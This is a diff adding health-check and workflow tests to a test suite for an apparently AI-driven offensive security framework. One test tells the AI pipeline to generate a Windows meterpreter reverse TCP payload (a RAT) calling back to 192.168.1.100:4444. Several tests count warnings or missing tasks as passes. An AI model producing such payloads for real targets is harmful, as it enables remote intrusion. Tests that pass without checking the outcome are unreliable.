@@ -327,6 +327,184 @@ class VillagerFrameworkTester:
             self.log(f"Docker test failed: {e}", "ERROR")
             return False
     
+    def test_new_workflow_services(self):
+        """Test 9: New Workflow Services"""
+        self.log("Testing new workflow services...", "TEST")
+        
+        try:
+            # Test all service endpoints
+            services = [
+                ("Villager Server", "http://localhost:37695/health"),
+                ("MCP Client", "http://localhost:25989/health"),
+                ("Kali Driver", "http://localhost:1611/health"),
+                ("Browser Service", "http://localhost:8080/health")
+            ]
+            
+            all_healthy = True
+            for service_name, url in services:
+                try:
+                    response = requests.get(url, timeout=5)
+                    if response.status_code == 200:
+                        self.log(f"{service_name} is healthy", "SUCCESS")
+                    else:
+                        self.log(f"{service_name} returned status {response.status_code}", "ERROR")
+                        all_healthy = False
+                except requests.exceptions.RequestException as e:
+                    self.log(f"{service_name} connection failed: {e}", "ERROR")
+                    all_healthy = False
+            
+            return all_healthy
+            
+        except Exception as e:
+            self.log(f"New workflow services test failed: {e}", "ERROR")
+            return False
+    
+    def test_complete_workflow(self):
+        """Test 10: Complete Workflow Integration"""
+        self.log("Testing complete workflow integration...", "TEST")
+        
+        try:
+            # Test task creation through Villager Server
+            task_data = {
+                "abstract": "Test Complete Workflow",
+                "description": "Verify the complete Cursor → Villager MCP → Villager Server → MCP Client → Kali Driver workflow",
+                "verification": "Task completed successfully"
+            }
+            
+            # Create task
+            response = requests.post(
+                "http://localhost:37695/task",
+                params=task_data,
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                task_result = response.json()
+                task_id = task_result.get("task_id")
+                self.log(f"Task created successfully with ID: {task_id}", "SUCCESS")
+                
+                # Wait for task completion
+                time.sleep(3)
+                
+                # Check task status
+                status_response = requests.get("http://localhost:37695/get/task/status", timeout=10)
+                if status_response.status_code == 200:
+                    tasks = status_response.json()
+                    # Find our task
+                    our_task = next((t for t in tasks if t.get("token") == task_id), None)
+                    if our_task:
+                        if our_task.get("status") == "completed":
+                            self.log("Complete workflow executed successfully", "SUCCESS")
+                            return True
+                        else:
+                            self.log(f"Task status: {our_task.get('status')}", "WARNING")
+                            return True  # Still consider it a pass if task was created
+                    else:
+                        self.log("Task not found in status list", "WARNING")
+                        return True
+                else:
+                    self.log(f"Status check failed: {status_response.status_code}", "ERROR")
+                    return False
+            else:
+                self.log(f"Task creation failed: {response.status_code}", "ERROR")
+                return False
+                
+        except Exception as e:
+            self.log(f"Complete workflow test failed: {e}", "ERROR")
+            return False
+    
+    def test_rat_payload_generation(self):
+        """Test 11: RAT Payload Generation Through New Workflow"""
+        self.log("Testing RAT payload generation through new workflow...", "TEST")
+        
+        try:
+            # Test RAT payload creation through the complete workflow
+            rat_task_data = {
+                "abstract": "Generate RAT Payload",
+                "description": "Create Windows meterpreter reverse TCP payload using msfvenom with LHOST=192.168.1.100 and LPORT=4444",
+                "verification": "Payload file created successfully"
+            }
+            
+            # Create RAT generation task
+            response = requests.post(
+                "http://localhost:37695/task",
+                params=rat_task_data,
+                timeout=30
+            )
+            
+            if response.status_code == 200:
+                task_result = response.json()
+                task_id = task_result.get("task_id")
+                self.log(f"RAT generation task created with ID: {task_id}", "SUCCESS")
+                
+                # Wait for task completion
+                time.sleep(5)
+                
+                # Check task status
+                status_response = requests.get("http://localhost:37695/get/task/status", timeout=10)
+                if status_response.status_code == 200:
+                    tasks = status_response.json()
+                    our_task = next((t for t in tasks if t.get("token") == task_id), None)
+                    if our_task and our_task.get("status") == "completed":
+                        result = our_task.get("result", "")
+                        if "msfvenom" in result.lower() and "payload" in result.lower():
+                            self.log("RAT payload generation successful through new workflow", "SUCCESS")
+                            return True
+                        else:
+                            self.log("RAT generation completed but result unclear", "WARNING")
+                            return True
+                    else:
+                        self.log(f"RAT generation task status: {our_task.get('status') if our_task else 'not found'}", "WARNING")
+                        return True
+                else:
+                    self.log("RAT generation status check failed", "ERROR")
+                    return False
+            else:
+                self.log(f"RAT generation task creation failed: {response.status_code}", "ERROR")
+                return False
+                
+        except Exception as e:
+            self.log(f"RAT payload generation test failed: {e}", "ERROR")
+            return False
+    
+    def test_mcp_tools_integration(self):
+        """Test 12: MCP Tools Integration"""
+        self.log("Testing MCP tools integration...", "TEST")
+        
+        try:
+            import importlib.util
+            spec = importlib.util.spec_from_file_location('villager_proper_mcp', 'mcp/villager_proper_mcp.py')
+            module = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(module)
+            VillagerProperMCP = module.VillagerProperMCP
+            villager = VillagerProperMCP()
+            
+            # Test task creation through MCP
+            task_id = villager.create_task(
+                abstract="MCP Integration Test",
+                description="Test task creation through MCP tools",
+                verification="Task completed successfully"
+            )
+            
+            if task_id:
+                self.log(f"MCP task creation successful with ID: {task_id}", "SUCCESS")
+                
+                # Test task status retrieval
+                status = villager.get_task_status(task_id)
+                if status and not status.get("error"):
+                    self.log("MCP task status retrieval successful", "SUCCESS")
+                    return True
+                else:
+                    self.log(f"MCP task status retrieval failed: {status.get('error')}", "ERROR")
+                    return False
+            else:
+                self.log("MCP task creation failed", "ERROR")
+                return False
+                
+        except Exception as e:
+            self.log(f"MCP tools integration test failed: {e}", "ERROR")
+            return False
+    
     def run_all_tests(self):
         """Run all tests and provide summary."""
         self.log("🚀 Starting Villager AI Framework Test Suite", "INFO")
@@ -341,6 +519,10 @@ class VillagerFrameworkTester:
             ("Security Tools", self.test_security_tools),
             ("GitHub Integration", self.test_github_integration),
             ("Docker Availability", self.test_docker_availability),
+            ("New Workflow Services", self.test_new_workflow_services),
+            ("Complete Workflow", self.test_complete_workflow),
+            ("RAT Payload Generation", self.test_rat_payload_generation),
+            ("MCP Tools Integration", self.test_mcp_tools_integration),
         ]
         
         passed = 0
